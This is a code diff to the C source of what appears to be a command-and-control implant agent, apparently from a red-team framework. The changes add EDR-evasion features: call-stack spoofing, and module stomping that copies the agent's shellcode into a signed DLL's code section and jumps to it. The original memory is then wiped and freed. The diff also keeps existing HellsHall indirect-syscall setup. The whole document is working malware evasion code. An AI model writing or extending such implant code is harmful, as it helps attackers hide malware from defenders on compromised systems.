@@ -793,11 +793,20 @@ VOID agent_init(PINSTANCE inst, HINSTANCE hDll) {
     // Eagerly load sleepmask COFF so BeaconGate works before first sleep
 #ifdef INCLUDE_EVASION_HELLSHALL
 #ifdef _WIN64
-    // HellsHall indirect syscalls — x64 only. On x86 (WOW64), 32-bit ntdll
+    // HellsHall indirect syscalls - x64 only. On x86 (WOW64), 32-bit ntdll
     // doesn't use sysenter directly; it transitions through wow64cpu.dll's
     // heaven's gate. Direct sysenter from WOW64 context crashes.
     hellshall_init(inst);
     DBG(inst, "[ES] HellsHall initialized");
+#endif
+#endif
+
+#ifdef INCLUDE_EVASION_CALLSTACK_SPOOF
+#ifdef _WIN64
+    // Desync/SilentMoonwalk callstack spoofing - x64 only.
+    // Must run after HellsHall init and API resolution.
+    callstack_spoof_init(inst);
+    DBG(inst, "[ES] Callstack spoofing initialized");
 #endif
 #endif
 
@@ -1292,8 +1301,34 @@ VOID es_smb_process_tasking(PINSTANCE inst, const BYTE* msg, DWORD msg_len,
 
 VOID agent_main(PINSTANCE inst) {
     inst->Running = TRUE;
+
+    // In module-stomped mode, TRACE may crash because CreateFileA is resolved
+    // but the inst passed here is in the sacrifice DLL's .text.
+    // Let's verify the APIs are valid before using them.
+#ifdef INCLUDE_EVASION_MODULE_STOMP
+#ifdef _WIN64
+    if (inst->ModuleStomp.bEntryPatched && inst->pOriginalAlloc && inst->szOriginalAlloc) {
+        // Directly call VirtualProtect via function pointer - don't go through
+        // gate_ wrapper or TRACE (both might access structures that are invalid
+        // in the new copy).
+        DWORD _mso = 0;
+        if (inst->Win32.VirtualProtect) {
+            inst->Win32.VirtualProtect(inst->pOriginalAlloc,
+                inst->szOriginalAlloc, PAGE_READWRITE, &_mso);
+        }
+        es_memset(inst->pOriginalAlloc, 0, inst->szOriginalAlloc);
+        if (inst->Win32.VirtualFree) {
+            inst->Win32.VirtualFree(inst->pOriginalAlloc, 0, MEM_RELEASE);
+        }
+        inst->pOriginalAlloc = NULL;
+        inst->szOriginalAlloc = 0;
+    }
+#endif
+#endif
+
     TRACE(inst, "agent_main: entered");
     DBG(inst, "[ES] agent_main entered");
+
     register_commands(inst);
     TRACE(inst, "agent_main: commands registered");
 
@@ -1709,8 +1744,37 @@ EXTERN_C VOID main_entry(PVOID base_addr) {
     es_memset(inst, 0, sizeof(INSTANCE));
     inst->Base.Buffer = base_addr;
 
+    // Compute Base.Length: total shellcode size from _start through __InstanceStorage.
+    // __InstanceStorage (16384 bytes) is at the end of the .text blob.
+    // INSTANCE pointer from _get_instance() points into __InstanceStorage.
+    // Total length = (INSTANCE address + sizeof(INSTANCE) padding) - base_addr.
+    // More precisely: __InstanceStorage is 16384 bytes, and the INSTANCE lives
+    // at the start of it. Total blob = (PBYTE)inst + 16384 - (PBYTE)base_addr.
+    inst->Base.Length = (ULONG)((PBYTE)inst + 16384 - (PBYTE)base_addr);
+
     agent_init(inst, (HINSTANCE)base_addr);
     TRACE(inst, "main_entry: agent_init returned");
+
+#ifdef INCLUDE_EVASION_MODULE_STOMP
+#ifdef _WIN64
+    // Module stomping: copy the agent into a signed DLL's .text section.
+    // Must run after agent_init (needs resolved APIs, parsed config, evasion patches).
+    // If successful, module_stomp_init transfers execution to the stomped copy's
+    // agent_main and does NOT return. If it fails, we fall through to agent_main
+    // from the original allocation.
+    if (inst->Base.Length > 0 && !inst->ModuleStomp.bEntryPatched) {
+        TRACE(inst, "main_entry: calling module_stomp_init");
+        if (module_stomp_init(inst)) {
+            // Execution was transferred; we should not reach here.
+            // But if we do (e.g. agent_main returned), just exit.
+            TRACE(inst, "main_entry: module_stomp_init returned TRUE (transfer)");
+            return;
+        }
+        TRACE(inst, "main_entry: module_stomp_init returned FALSE");
+        DBG(inst, "[ES] ModuleStomp failed, continuing from original allocation");
+    }
+#endif
+#endif
 
     /* NOTE: INCLUDE_EVASION_CLEANUP does not apply here. In standalone PIC mode
        base_addr is the allocation holding this agent's own .text and instance
